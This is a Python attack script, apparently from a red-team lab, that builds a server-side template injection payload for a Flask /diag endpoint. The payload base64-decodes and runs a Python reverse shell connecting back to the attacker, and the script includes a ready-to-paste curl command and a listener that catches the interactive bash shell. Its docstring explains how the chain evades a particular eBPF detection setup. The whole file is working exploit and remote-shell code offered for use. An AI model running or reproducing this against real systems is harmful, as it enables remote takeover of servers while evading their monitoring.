#!/usr/bin/env python3
"""
red_reverse_shell.py - TCP Reverse Shell via SSTI (eBPF v1 Bypass)
================================================================================
MITRE ATT&CK : T1059.006  T1190  T1071.001
Kill Chain    : Phase 5 — Evasion after Blue Team Detection

WHY THIS BYPASSES eBPF v1:
--------------------------
Blue Team v1 (blue_ebpf_mdr.py) hooks three syscalls:
  1. memfd_create  → fileless staging detector
  2. execve        → /proc/fd execution detector
  3. socket(RAW)   → raw ICMP covert channel detector

This reverse shell uses NONE of those:
  - socket(AF_INET, SOCK_STREAM, 0)  → regular TCP, not SOCK_RAW
  - connect()                          → outbound TCP, not monitored by v1
  - dup2()                             → redirect stdio, not monitored by v1
  - pty.spawn("/bin/bash")             → normal execve of /bin/bash, not /proc/fd

The entire attack uses standard, legitimate syscalls that v1 ignores.

Delivery chain (3 stages):

  Stage 1 — SSTI Injection (same as red_attacker.py)
    {{ config.__class__.__init__.__globals__['os'].popen('...') }}

  Stage 2 — Base64 Decode Pipeline
    echo <B64> | base64 -d | python3

  Stage 3 — Reverse Shell (no memfd_create)
    fork()           → parent exits so Flask returns the HTTP response
    socket.connect() → regular TCP connection back to attacker
    dup2(fd, 0/1/2)  → redirect stdin/stdout/stderr to the socket
    pty.spawn()      → interactive bash shell over TCP

Usage:
  python3 red_reverse_shell.py -t TARGET_IP -l ATTACKER_IP
  python3 red_reverse_shell.py -t TARGET_IP -l ATTACKER_IP --payload-only
================================================================================
"""
import base64
import urllib.parse
import argparse
import socket
import sys
import os
import select


# ═══════════════════════════════════════════════════════════════
#  SSTI Payload Generator — Reverse Shell Edition
# ═══════════════════════════════════════════════════════════════

def generate_ssti_payload(attacker_ip: str, attacker_port: int) -> str:
    """Build SSTI payload with a standard TCP reverse shell.

    Key difference from red_attacker.py:
      red_attacker.py : memfd_create → write agent → fork → execve /proc/fd → ICMP
      THIS SCRIPT     : fork → socket.connect → dup2 → pty.spawn (all standard)
    """
    # This script runs on the target via SSTI → os.popen → base64 -d | python3
    # fork() so the parent (popen subprocess) exits and Flask can respond.
    # The child connects back to the attacker over a regular TCP socket.
    shell_code = (
        'import socket,os,pty\n'
        'if os.fork()==0:\n'
        '    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n'
        f'    s.connect(("{attacker_ip}",{attacker_port}))\n'
        '    os.dup2(s.fileno(),0)\n'
        '    os.dup2(s.fileno(),1)\n'
        '    os.dup2(s.fileno(),2)\n'
        '    pty.spawn("/bin/bash")\n'
    )
    shell_b64 = base64.b64encode(shell_code.encode()).decode()

    # SSTI expression — same traversal as red_attacker.py
    # config.__class__.__init__.__globals__['os'].popen('...')
    ssti = (
        "{{config.__class__.__init__.__globals__['os']"
        ".popen('echo "
        + shell_b64
        + "|base64${IFS}-d|python3').read()}}"
    )
    return ssti


def generate_curl_command(target_ip: str, target_port: int,
                          attacker_ip: str, attacker_port: int) -> str:
    """Return a ready-to-paste curl command with URL-encoded SSTI payload."""
    raw_ssti = generate_ssti_payload(attacker_ip, attacker_port)
    encoded = urllib.parse.quote(raw_ssti, safe='')
    return (
        f'curl -s -X POST http://{target_ip}:{target_port}/diag '
        f'-d "query={encoded}"'
    )


# ═══════════════════════════════════════════════════════════════
#  TCP Listener — catches the incoming reverse shell
# ═══════════════════════════════════════════════════════════════

def listener(port: int):
    """Simple TCP listener for the reverse shell connection."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', port))
    srv.listen(1)
    print(f"\n[*] Listening on 0.0.0.0:{port}...\n")

    conn, addr = srv.accept()
    print(f"\033[92m[+] Reverse shell from {addr[0]}:{addr[1]}\033[0m")
    print("[*] Interactive shell — type 'exit' to quit\n")

    try:
        while True:
            ready, _, _ = select.select([conn, sys.stdin], [], [], 1.0)
            for r in ready:
                if r is conn:
                    data = conn.recv(4096)
                    if not data:
                        print("\n[*] Connection closed by target")
                        return
                    sys.stdout.write(data.decode(errors='replace'))
                    sys.stdout.flush()
                elif r is sys.stdin:
                    line = sys.stdin.readline()
                    if not line or line.strip() == 'exit':
                        return
                    conn.sendall(line.encode())
    except (KeyboardInterrupt, BrokenPipeError, ConnectionResetError):
        print("\n[*] Shell terminated")
    finally:
        conn.close()
        srv.close()


# ═══════════════════════════════════════════════════════════════
#  Main
# ═══════════════════════════════════════════════════════════════

def main():
    p = argparse.ArgumentParser(
        description='Red Team TCP Reverse Shell (eBPF v1 Bypass)')
    p.add_argument('--target', '-t', required=True, help='Target IP')
    p.add_argument('--lhost', '-l', required=True,
                   help='Attacker IP (shell connects back here)')
    p.add_argument('--lport', type=int, default=4444,
                   help='Attacker listen port (default 4444)')
    p.add_argument('--tport', type=int, default=9999,
                   help='Target app port (default 9999)')
    p.add_argument('--payload-only', action='store_true',
                   help='Only print the SSTI curl command, then exit')
    args = p.parse_args()

    print("\033[91m")
    print("+" + "=" * 52 + "+")
    print("|  Red Team  Reverse Shell  v2.0                  |")
    print("|  eBPF v1 Bypass — No memfd_create               |")
    print("|  Standard TCP Connect-Back Shell                 |")
    print("+" + "=" * 52 + "+")
    print("\033[0m")
    print(f"  Target : {args.target}:{args.tport}")
    print(f"  Lhost  : {args.lhost}:{args.lport}")
    print(f"  Method : SSTI → fork → connect → dup2 → pty.spawn")
    print(f"  Bypass : No memfd_create, no ICMP, no raw socket")
    print()

    curl_cmd = generate_curl_command(
        args.target, args.tport, args.lhost, args.lport)
    print("\033[93m[*] SSTI attack command "
          "(paste into another terminal):\033[0m\n")
    print(f"  {curl_cmd}\n")

    if args.payload_only:
        return

    listener(args.lport)


if __name__ == '__main__':
    main()
